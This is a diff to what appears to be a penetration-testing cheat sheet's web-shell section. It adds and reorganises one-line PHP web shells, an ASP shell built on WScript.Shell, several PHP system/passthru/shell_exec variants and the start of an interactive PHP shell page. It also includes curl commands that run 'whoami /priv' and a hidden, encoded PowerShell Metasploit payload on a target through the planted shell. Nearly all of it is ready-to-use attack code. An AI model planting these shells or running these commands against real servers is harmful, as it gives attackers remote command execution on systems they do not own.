@@ -235,19 +235,19 @@ gg ''
 
 ## Web
 [*] Web Shell
-+---------- Create Shell ----------+
++---------- Create ----------+
+-->> PHP
 echo -n '<?=`$_GET[cmd]`?>' | tee x.php
 
-+---------- Upload Shell ----------+
-Upload x.php
+-->> ASP
+echo -n '<% Response.ContentType = "text/plain"\nSet s = CreateObject("WScript.Shell")\nSet c = s.Exec("cmd /c " & Request("cmd"))\nResponse.Write c.StdOut.ReadAll() %>' | tee x.asp
 
-+---------- Execute Shell ----------+
-curl -G --path-as-is 'http://10.10.11.17/data/modules/x/x.php' --data-urlencode 'cmd=whoami /priv'
-curl -G --path-as-is 'http://10.10.11.17/data/modules/x/x.php' --data-urlencode 'cmd=id'
-curl -G --path-as-is 'http://$TARGET/0.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
++---------- Execute ----------+
+curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=whoami /priv'
+curl -G --path-as-is 'http://$TARGET/x.php' --data-urlencode 'cmd=powershell.exe -nop -w hidden -e WwBOAGUAdAAuAFMAZQB...<METASPLOIT>...'
 
 +---------- Variations ----------+
-PHP
+-->> PHP
 <?=`$_GET[cmd]`?>
 <?php system($_GET['cmd']); ?>
 <?php passthru($_GET['cmd']); ?>
@@ -256,12 +256,7 @@ PHP
 <?php echo passthru($_GET['cmd']); ?>
 <?php echo shell_exec($_GET['cmd']); ?>
 
-ASP
-<% Response.ContentType = "text/plain"
-Set s = CreateObject("WScript.Shell")
-Set c = s.Exec("cmd /c " & Request("cmd"))
-Response.Write c.StdOut.ReadAll() %>
-
+-->> PHP Interactive
 <html>
 <body style="background: black;color: whitesmoke;font-family: 'Fira Code', 'Consolas', 'Liberation Mono', 'Courier New', monospace;font-size: 15px;margin: 10px 0 0 18px;">
 <form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
